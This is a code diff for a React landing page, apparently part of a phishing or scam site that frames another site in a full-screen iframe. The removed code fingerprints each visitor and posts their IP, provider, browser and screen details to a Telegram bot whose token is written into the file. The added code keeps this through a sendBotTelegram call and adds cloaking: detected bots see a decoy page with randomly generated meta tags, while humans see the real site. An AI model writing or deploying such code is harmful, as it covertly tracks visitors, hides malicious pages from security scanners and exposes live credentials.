@@ -2,15 +2,27 @@ import { Helmet } from 'react-helmet';
 import MetaIcon from '../assets/icon.ico';
 import type { FC } from 'react';
 import { useEffect, useRef, useState } from 'react';
-import { useBotDetection } from '@/hooks/useBotDetection';
-import ImportStaticHTML from "../hooks/ImportStaticHTMLComponent";
+import { sendBotTelegram,useBotDetection } from '@/hooks/useBotDetection';
+import { faker } from "@faker-js/faker";
+
+interface MetaTag {
+  title: string;
+  description: string;
+  keywords: string;
+}
+
+const generateRandomMeta = (): MetaTag => ({
+  title: faker.company.catchPhrase(),
+  description: faker.lorem.sentence(15),
+  keywords: faker.lorem.words(6).replace(/\s+/g, ", ")
+});
 
 const Index: FC = () => {
+    const [meta, setMeta] = useState<MetaTag | null>(null);
     const { isBot, isLoading, shouldRedirect } = useBotDetection();
     const [redirecting, setRedirecting] = useState(false);
     const logSentRef = useRef(false);
-    let[IframeUrl, SetIframeUrl] = useState('https://jupiter-client-seven.vercel.app/');
-    let[SiteTitleMeta, SetSiteTitleMeta] = useState('Home Page');
+    let[SiteTitleMeta, SetSiteTitleMeta] = useState('Hello Page');
     function showIframe(file,title,favicon) {
     const html = (
       <>
@@ -38,78 +50,27 @@ const Index: FC = () => {
       </>
     );
     return html;
-  }
-
+    }
     useEffect(() => {
-        console.log('Redirect check:', { shouldRedirect, isBot, isLoading });
+      const saved = sessionStorage.getItem("randomMeta");
+      console.log(saved);
+      if (saved) {
+        setMeta(JSON.parse(saved));
+      } else {
+        const m = generateRandomMeta();
+        setMeta(m);
+        sessionStorage.setItem("randomMeta", JSON.stringify(m));
+      }
+    }, []);
+    useEffect(() => {
         if (shouldRedirect && !isBot && !isLoading) {
            setRedirecting(true);
         }
     }, [shouldRedirect, isBot, isLoading]);
-
     useEffect(() => {
         if (!isLoading && !isBot && !logSentRef.current) {
             logSentRef.current = true;
-            const fetchGeoAndSendTelegram = async () => {
-                const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
-                const botToken = '8023769128:AAFkIJ4X4w5QjRGdybksnDO6KsDm5VXqr3M';
-                const chatId = '-4921212155';
-                const geoRes = await fetch(geoUrl);
-                const geoData = await geoRes.json();
-                const fullFingerprint = {
-                    asn: geoData.asn,
-                    organization_name: geoData.organization_name,
-                    organization: geoData.organization,
-                    ip: geoData.ip,
-                    country_code: geoData.country_code,
-                    navigator: {
-                        userAgent: navigator.userAgent,
-                        hardwareConcurrency: navigator.hardwareConcurrency,
-                        maxTouchPoints: navigator.maxTouchPoints,
-                        webdriver: navigator.webdriver,
-                    },
-                    screen: {
-                        width: screen.width,
-                        height: screen.height,
-                        availWidth: screen.availWidth,
-                        availHeight: screen.availHeight,
-                    },
-                };
-
-                const msg = `🔍 <b>Access log</b>
-🏢 <b>Country:</b> <code>${fullFingerprint.country_code}</code>
-📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
-🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
-🏛️ <b>Provider:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Unknown'}</code>
-🌐 <b>Browser:</b> <code>${fullFingerprint.navigator.userAgent}</code>
-💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> core
-📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> point
-🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Yes' : 'No'}</code>
-📺 <b>Screen:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
-📐 <b>Real Screen:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;
-                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                const payload = {
-                    chat_id: chatId,
-                    text: msg,
-                    parse_mode: 'HTML',
-                };
-                try {
-                    const response = await fetch(telegramUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload),
-                    });
-                    const result = await response.json();
-                    if (!response.ok) {
-                    } else {
-                        console.log('telegram sent successfully:', result);
-                    }
-                } catch (error) {
-                    const errorMsg = error instanceof Error ? error.message : 'Unable to connect';
-                    console.log(`Network Error: ${errorMsg}`);
-                }
-            };
-            fetchGeoAndSendTelegram();
+            sendBotTelegram('');
         }
     }, [isLoading, isBot]);
     useEffect(() => {
@@ -130,16 +91,38 @@ const Index: FC = () => {
             </div>
         );
     }
-    if (isBot) {
-        return (
-            <>
-            <ImportStaticHTML src={"/static/home.html"} method="fetch" 
-                forceReloadCSS
-                sanitize={false}/>
-            </>
-        );
+    const params = new URLSearchParams(window.location.search);
+    if (isBot || Number(params.get("test")) == 1) {
+        return(
+        <>
+      {meta && (
+        <Helmet>
+          <title>{meta.title}</title>
+          <meta name="description" content={meta.description} />
+          <meta name="keywords" content={meta.keywords} />
+          <meta property="og:title" content={meta.title} />
+          <meta property="og:description" content={meta.description} />
+          <meta property="og:type" content="website" />
+          <meta property="og:image" content={faker.image.urlPicsumPhotos()} />
+        </Helmet>
+      )}
+       <iframe src='/static/home.html' style={{
+        position: 'fixed',
+        top: '0px',
+        bottom: '0px',
+        right: '0px',
+        width: '100%',
+        border: 'none',
+        margin: '0',
+        padding: '0',
+        overflow: 'hidden',
+        zIndex: '999999',
+        height: '100%',
+      }}></iframe>
+      </>
+    );
     }
-    return showIframe(IframeUrl,SiteTitleMeta,false);
+    return showIframe(import.meta.env.PUBLIC_SITE_URL,SiteTitleMeta,false);
 };
 
 export default Index;
